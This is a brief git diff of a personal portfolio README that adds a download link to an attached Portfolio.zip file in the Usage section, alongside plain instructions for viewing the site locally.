@@ -17,7 +17,7 @@ To view this portfolio locally:
 2. Open `index.html` in your web browser.
 
 ## Usage
-
+[Portfolio.zip](https://github.com/user-attachments/files/16809343/Portfolio.zip)
 Navigate through the portfolio to view my projects, skills, and contact information.
 
 ## Contact
